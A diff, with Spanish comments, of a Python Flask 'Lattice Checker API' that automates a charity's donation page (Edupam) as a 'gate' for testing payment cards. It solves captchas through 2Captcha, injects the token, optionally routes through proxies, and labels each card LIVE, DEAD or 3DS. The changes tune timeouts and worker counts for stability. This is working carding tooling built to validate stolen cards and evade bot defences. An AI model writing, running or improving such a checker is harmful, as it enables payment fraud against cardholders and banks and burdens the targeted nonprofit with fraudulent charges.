@@ -6,7 +6,6 @@ import threading
 import time
 import asyncio
 import random
-import string
 import logging
 import base64
 import datetime
@@ -32,24 +31,17 @@ EDUPAM_DONOR_EMAIL = os.environ.get('EDUPAM_DONOR_EMAIL', '')
 EDUPAM_BASE_URL = os.environ.get('EDUPAM_BASE_URL', 'https://www.edupam.org')
 EDUPAM_ENDPOINT = os.environ.get('EDUPAM_ENDPOINT', '/mx/dona/')
 DONATION_AMOUNT = int(os.environ.get('DONATION_AMOUNT', '50'))
-MAX_WORKERS = int(os.environ.get('MAX_WORKERS', '5'))
+MAX_WORKERS = int(os.environ.get('MAX_WORKERS', '2'))  # REDUCIDO para ahorrar RAM
 
 # ================================================================
-# 🔥 VARIABLE PARA CONTROLAR EL PROXY (cámbiala aquí)
-#    True  → usa el proxy configurado en PROXY_STRING
-#    False → NO usa proxy (conexión directa)
-# ================================================================
-USE_PROXY = False  # <--- Pon True o False según necesites
-
-# PROXY_STRING (solo se usa si USE_PROXY es True)
+# 🔥 VARIABLE PARA CONTROLAR EL PROXY
+USE_PROXY = False
 PROXY_STRING = os.environ.get('PROXY_STRING', '')
-
-# Variables de proxy individuales (por si acaso, solo si USE_PROXY es True)
 PROXY_SERVER = os.environ.get('PROXY_SERVER', '')
 PROXY_USERNAME = os.environ.get('PROXY_USERNAME', '')
 PROXY_PASSWORD = os.environ.get('PROXY_PASSWORD', '')
 
-# ==================== PARSEO DE PROXY_STRING ====================
+# ==================== PARSEO DE PROXY ====================
 def parse_proxy_string(proxy_string):
     if not proxy_string:
         return None
@@ -58,34 +50,22 @@ def parse_proxy_string(proxy_string):
         username, password = auth.split(':', 1)
         if not host.startswith(('http://', 'https://')):
             host = 'http://' + host
-        return {
-            'server': host,
-            'username': username,
-            'password': password
-        }
+        return {'server': host, 'username': username, 'password': password}
     except Exception as e:
         logger.error(f"Error parseando PROXY_STRING: {e}")
         return None
 
-# Determinar configuración de proxy final SOLO si USE_PROXY es True
 proxy_config = None
 if USE_PROXY:
     if PROXY_STRING:
         proxy_config = parse_proxy_string(PROXY_STRING)
         if proxy_config:
-            logger.info(f"✅ Proxy configurado mediante PROXY_STRING: {proxy_config['server']}")
-        else:
-            logger.warning("⚠️ PROXY_STRING inválida, se intentará usar variables individuales")
-
+            logger.info(f"✅ Proxy configurado: {proxy_config['server']}")
     if not proxy_config and PROXY_SERVER:
-        proxy_config = {
-            'server': PROXY_SERVER,
-            'username': PROXY_USERNAME,
-            'password': PROXY_PASSWORD
-        }
-        logger.info(f"✅ Proxy configurado mediante variables individuales: {PROXY_SERVER}")
+        proxy_config = {'server': PROXY_SERVER, 'username': PROXY_USERNAME, 'password': PROXY_PASSWORD}
+        logger.info(f"✅ Proxy configurado vía individuales: {PROXY_SERVER}")
 else:
-    logger.info("ℹ️ Proxy desactivado (USE_PROXY = False)")
+    logger.info("ℹ️ Proxy desactivado")
 
 # ==================== VARIABLES GLOBALES ====================
 checking_status = {
@@ -97,8 +77,6 @@ checking_status = {
     'error': 0,
     'current': '',
     'results': [],
-    'loop': None,
-    'task': None,
     'stop_on_live': False
 }
 
@@ -147,7 +125,7 @@ async def solve_captcha_api_async(page_url, sitekey):
                     "isInvisible": False
                 }
             }
-            resp = requests.post("https://api.2captcha.com/createTask", json=data, timeout=30)
+            resp = requests.post("https://api.2captcha.com/createTask", json=data, timeout=60)  # +timeout
             result = resp.json()
             if result.get("errorId", 1) != 0:
                 logger.error(f"2Captcha error: {result.get('errorDescription')}")
@@ -155,9 +133,10 @@ async def solve_captcha_api_async(page_url, sitekey):
             task_id = result["taskId"]
             logger.info(f"2Captcha task created: {task_id}")
             
-            for _ in range(30):
+            for _ in range(60):  # más intentos (60*5=300s)
                 time.sleep(5)
-                resp2 = requests.post("https://api.2captcha.com/getTaskResult", json={"clientKey": API_KEY_2CAPTCHA, "taskId": task_id}, timeout=30)
+                resp2 = requests.post("https://api.2captcha.com/getTaskResult", 
+                                      json={"clientKey": API_KEY_2CAPTCHA, "taskId": task_id}, timeout=60)
                 status = resp2.json()
                 if status.get("status") == "ready":
                     token = status.get("solution", {}).get("gRecaptchaResponse")
@@ -210,7 +189,7 @@ async def solve_captcha_if_present(page):
                     }}
                 """, token)
                 logger.info("✅ Token inyectado")
-                await asyncio.sleep(2)
+                await asyncio.sleep(3)  # +espera
                 return True
             else:
                 logger.warning("❌ Fallo al resolver captcha")
@@ -220,7 +199,7 @@ async def solve_captcha_if_present(page):
         logger.error(f"Error en solve_captcha: {e}")
         return False
 
-# ==================== CLASE EDU SESSION (CORREGIDA) ====================
+# ==================== CLASE EDU SESSION ====================
 class EduSession:
     def __init__(self):
         self.playwright = None
@@ -229,7 +208,6 @@ class EduSession:
         self.page = None
         self.is_open = False
         self.proxy = None
-        # Solo configurar el proxy si USE_PROXY es True y hay configuración
         if USE_PROXY and proxy_config:
             self.proxy = {
                 "server": proxy_config['server'],
@@ -243,7 +221,6 @@ class EduSession:
             self.playwright = await async_playwright().start()
             logger.info("🚀 Iniciando navegador (EduSession ASYNC)...")
             
-            # Asegurar que el proxy tenga el protocolo http:// (solo si existe)
             if self.proxy:
                 proxy_server = self.proxy.get('server')
                 if proxy_server and not proxy_server.startswith(('http://', 'https://')):
@@ -251,7 +228,7 @@ class EduSession:
             
             launch_options = {
                 "headless": HEADLESS,
-                "slow_mo": 50,
+                "slow_mo": 100,  # más lento pero menos CPU (ahorra RAM?)
                 "firefox_user_prefs": {
                     "network.cookie.cookieBehavior": 0,
                     "privacy.trackingprotection.enabled": False,
@@ -273,7 +250,8 @@ class EduSession:
             self.is_open = True
             url = f"{EDUPAM_BASE_URL}{EDUPAM_ENDPOINT}"
             logger.info(f"Navegando a {url}...")
-            await self.page.goto(url, timeout=60000, wait_until="domcontentloaded")
+            # TIMEOUT DE NAVEGACIÓN A 180 SEGUNDOS
+            await self.page.goto(url, timeout=180000, wait_until="domcontentloaded")
             return True
         except Exception as e:
             logger.error(f"Error start_browser: {e}")
@@ -331,11 +309,12 @@ class EduSession:
             current_url = page.url.rstrip('/')
             target_url = f"{EDUPAM_BASE_URL}{EDUPAM_ENDPOINT}".rstrip('/')
             if current_url != target_url:
-                await page.goto(target_url, timeout=40000)
+                await page.goto(target_url, timeout=120000)  # 120s
             else:
                 await page.reload()
             
-            await page.wait_for_selector('input[name="name"]', timeout=60000)
+            # Esperar formulario con timeout de 120s
+            await page.wait_for_selector('input[name="name"]', timeout=120000)
             
             if EDUPAM_DONOR_NAME and EDUPAM_DONOR_LASTNAME:
                 name = EDUPAM_DONOR_NAME
@@ -377,19 +356,19 @@ class EduSession:
             except:
                 await page.evaluate("document.querySelector('#btn-donation').click()")
             
-            await asyncio.sleep(3)
+            await asyncio.sleep(5)  # más espera
             
             if API_KEY_2CAPTCHA:
                 await solve_captcha_if_present(page)
             
-            # ⏱️ TIMEOUT REDUCIDO A 30 SEGUNDOS PARA PRUEBAS
-            end_time = time.time() + 30
+            # TIMEOUT DE POLLING A 180 SEGUNDOS (3 MINUTOS)
+            end_time = time.time() + 180
             final_status = "UNKNOWN"
             final_message = "Timeout"
             
             while time.time() < end_time:
                 try:
-                    elapsed = int(time.time() - (end_time - 30))
+                    elapsed = int(time.time() - (end_time - 180))
                     logger.info(f"⏳ Polling #{elapsed}s - URL: {page.url}")
 
                     if "success" in page.url or "gracias" in page.url:
@@ -463,19 +442,13 @@ class EduSession:
                     if "closed" in err_str or "connection" in err_str:
                         raise loop_e
                 
-                await asyncio.sleep(1)
+                await asyncio.sleep(2)  # poll cada 2s
             
-            # Si terminó por timeout, dejar mensaje claro
             if final_status == "UNKNOWN":
-                final_message = "No se detectó resultado en el tiempo límite (posible bloqueo o 3DS no manejado)"
+                final_message = "No se detectó resultado (posible bloqueo o 3DS no manejado)"
                 logger.warning(f"⚠️ {final_message}")
             
-            status_map = {
-                "LIVE": "LIVE",
-                "DEAD": "DEAD",
-                "3DS": "3DS",
-                "UNKNOWN": "ERROR"
-            }
+            status_map = {"LIVE": "LIVE", "DEAD": "DEAD", "3DS": "3DS", "UNKNOWN": "ERROR"}
             final_code = status_map.get(final_status, "ERROR")
             
             result = {
@@ -487,10 +460,7 @@ class EduSession:
                 "gate": "Edupam",
                 "amount": donation_amount,
                 "timestamp": dt.now().isoformat(),
-                "response": {
-                    "url": page.url,
-                    "evidence": final_message
-                }
+                "response": {"url": page.url, "evidence": final_message}
             }
             return result
             
@@ -507,7 +477,6 @@ class EduSession:
                 page.remove_listener("response", handle_response)
             except:
                 pass
-
 
 
 # ==================== WORKER ====================
@@ -570,7 +539,7 @@ async def process_cards_async(cards, amount, stop_on_live):
             else:
                 checking_status['error'] += 1
             
-            await asyncio.sleep(2)
+            await asyncio.sleep(3)  # pausa más larga entre tarjetas
             
     except Exception as e:
         logger.error(f"Error en worker: {e}")
@@ -591,8 +560,8 @@ def run_async_worker(cards, amount, stop_on_live):
 def index():
     return jsonify({
         "status": "online",
-        "service": "Lattice Checker API (Edupam) - Async",
-        "version": "3.0",
+        "service": "Lattice Checker API (Edupam) - Async (Slow & Stable)",
+        "version": "3.1",
         "endpoints": {
             "health": "/api/health",
             "status": "/api/status",
@@ -614,8 +583,8 @@ def index():
 def health_check():
     return jsonify({
         'status': 'online',
-        'service': 'Lattice Checker API Async',
-        'version': '3.0',
+        'service': 'Lattice Checker API Async (Slow)',
+        'version': '3.1',
         'timestamp': dt.now().isoformat(),
         'features': {
             '2captcha': bool(API_KEY_2CAPTCHA),
@@ -728,7 +697,7 @@ def cancel_check():
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
     debug = os.environ.get('FLASK_ENV', 'production') == 'development'
-    logger.info(f"🚀 Servidor iniciado en puerto {port}")
+    logger.info(f"🚀 Servidor iniciado en puerto {port} (modo lento y estable)")
     logger.info(f"🔧 Headless: {HEADLESS}, Proxy: {'Sí' if (USE_PROXY and proxy_config) else 'No'}")
     logger.info(f"🧩 2Captcha: {'Habilitado' if API_KEY_2CAPTCHA else 'Deshabilitado'}")
     app.run(host='0.0.0.0', port=port, debug=debug)
